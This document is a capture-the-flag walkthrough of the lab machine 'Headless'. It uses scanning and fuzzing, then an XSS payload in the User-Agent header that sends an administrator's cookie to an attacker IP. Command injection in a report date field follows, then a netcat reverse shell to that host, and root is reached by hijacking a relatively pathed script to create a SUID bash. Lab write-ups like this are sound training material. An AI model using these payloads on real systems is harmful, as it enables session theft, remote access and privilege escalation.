# Headless - Easy

```sh
sudo vim /etc/hosts
# add headless.htb

nmap -T4 -p- -A -Pn -v headless.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 9.2p1 Debian 2+deb12u2
    * 5000/tcp - http - Werkzeug httpd 2.2.2 (Python 3.11.2)

* the website on port 5000 is under construction and has a link to '/support'

* the '/support' page contains an input form for contacting support

* Googling for exploits associated with Werkzeug & Python version does not give much info

* web scan:

    ```sh
    gobuster dir -u http://headless.htb:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # excessive timeouts - reduce wordlist size, extensions list, and threads

    gobuster dir -u http://headless.htb:5000 -w /usr/share/wordlists/dirb/common.txt -t 10
    ```

* we can check the support form for any injection vulnerabilities - we need to intercept a request via Burp Suite and send to Repeater

* there is a 'is_admin' cookie, but only the first part of the cookie is base64-encoded as "user" & the second part cannot be decoded

* ```gobuster``` finds a '/dashboard' page with 500 server error - visiting this gives us the 'Unauthorized' page - it is very likely to be checking the 'is_admin' cookie value

* testing a request shows that the form validates the email format only, so we can check other fields for any injection

* we can save the captured request in Burp Suite to a file and attempt SQLi with ```sqlmap```:

    ```sh
    sqlmap -r support.req --batch --dump
    # this does not find anything
    ```

* we can attempt fuzzing with other command injection payloads to test further - we can fuzz with multiple wordlists for multiple injection types:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u 'http://headless.htb:5000' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'fname=FUZZ&lname=FUZZ&email=email@email.com&phone=FUZZ&message=FUZZ' -fs 153
    # filter the correct size

    ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u 'http://headless.htb:5000' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'fname=FUZZ&lname=FUZZ&email=email@email.com&phone=FUZZ&message=FUZZ' -fs 153

    ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt -u 'http://headless.htb:5000' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'fname=FUZZ&lname=FUZZ&email=email@email.com&phone=FUZZ&message=FUZZ' -fs 153
    ```

* while the tools work, we can check by manually injecting common payloads like ```<script>alert('XSS')</script>```

* when manually testing on the '/support' page, the webpage shows a warning page titled 'Hacking Attempt Detected', and mentions the message - "Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation."

* it also includes a 'Client Request Information' section, which is just the list of request headers

* we have the following information/clues now:

    * /dashboard page exists, but we cannot access it
    * 'is_admin' cookie is provided, but we cannot decode the value
    * XSS attack is possible, but detected by webpage
    * administrators are checking hacking attempts using request headers as client request info

* linking all of this, we can attempt to fuzz the request headers with XSS payloads to steal the administrator cookie, such that we are able to get the cookie value of any admins accessing the "Hacking Attempt Detected" page

* we can setup the XSS cookie stealing payload:

    * in Burp Suite, intercept the request with the XSS payload ```<script>alert('XSS')</script>``` submitted in the form, such that we get the warning message; send the request to Repeater

    * setup up a Python listener on port 80 using ```sudo python3 -m http.server 80``` to fetch the cookie value

    * in the intercepted request, use the XSS payload in each of the request headers, to steal the session cookie of the administrator:

        ```js
        <script>window.location = 'http://10.10.14.27/page?c=' + document.cookie </script>
        ```

* once the XSS payload is submitted in the 'User-Agent' header, within a minute, we get the cookie of the administrator on our listener

* in Developer tools, we can change the cookie value of 'is_admin' to the captured cookie and attempt to access '/dashboard' now

* this works and we can access the Administrator Dashboard now

* this page has a functionality to generate a website health report and contains an input form to select date

* on selecting any date & clicking on 'Generate Report', the page simply sends a POST request with the 'date' parameter having the date value in 'yyyy-dd-mm' format, and the output "Systems are up and running!" is shown

* we can check for any injection attacks here as well - intercept a valid request in Burp Suite and send to Repeater

* as the webapp seems to be running a check of sorts on the website, it is possible it could be running a command in the background

* so we can start testing with basic command injection attacks:

    * setup a listener for ping packets - ```sudo tcpdump -i tun0 icmp```

    * we can test using common command injection characters like ```;```, ```|```, ```&```, etc.

    * testing with ```;``` as the separator works - if we attempt the payload (spaces URL-encoded) ```date=2026-01-09;ping+-c+4+10.10.14.27```, the command ```ping -c 4 10.10.14.27``` is executed and we can see ping packets on the listener

* as command execution is confirmed, we can check for RCE:

    * setup a listener - ```nc -nvlp 4444```

    * use reverse shell one-liner payloads to test

    * the payload ```busybox nc 10.10.14.27 4444 -e bash``` works and we get reverse shell

* in reverse shell:

    ```sh
    whoami
    # dvir

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # we are in /home/dvir/app

    ls -la /home
    # there is only one user 'dvir'

    ls -la
    # enumerate webapp files

    cd

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # '(ALL) NOPASSWD: /usr/bin/syscheck'
    ```

* ```sudo -l``` shows that we can run ```/usr/bin/syscheck``` as 'root' - we can check this binary:

    ```sh
    ls -la /usr/bin/syscheck

    cat /usr/bin/syscheck
    ```

    ```sh
    #!/bin/bash

    if [ "$EUID" -ne 0 ]; then
    exit 1
    fi

    last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
    formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
    /usr/bin/echo "Last Kernel Modification Time: $formatted_time"

    disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
    /usr/bin/echo "Available disk space: $disk_space"

    load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
    /usr/bin/echo "System load average: $load_average"

    if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
    /usr/bin/echo "Database service is not running. Starting it..."
    ./initdb.sh 2>/dev/null
    else
    /usr/bin/echo "Database service is running."
    fi

    exit 0
    ```

    * if the script is not run as root, then the script exits

    * the script finds the most recently modified kernel file (starting with 'vmlinuz') and prints the timestamp

    * the script also prints disk space and system load average

    * in the end, it checks if the database service 'initdb.sh' is running or not - if it is not running, the script executes 'initdb.sh'

* in the ```/usr/bin/syscheck``` script, we can see that it refers the database service by its relative path and not its full path

* this means if we have a 'initdb.sh' in our home directory (or from wherever the script is executed), then we can trick the script into executing a malicious 'initdb.sh'

* we can attempt this exploit:

    ```sh
    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/dvir/initdb.sh
    # copies the 'bash' binary and assigns it SUID bit, so that we can run it with privileged flag

    chmod 777 initdb.sh
    # make it executable by all

    sudo /usr/bin/syscheck
    # run the script as root
    # this works and the 'database service' is started by the script

    ls -la /tmp
    # confirm the bash binary is copied with SUID bit

    /tmp/bash -p
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
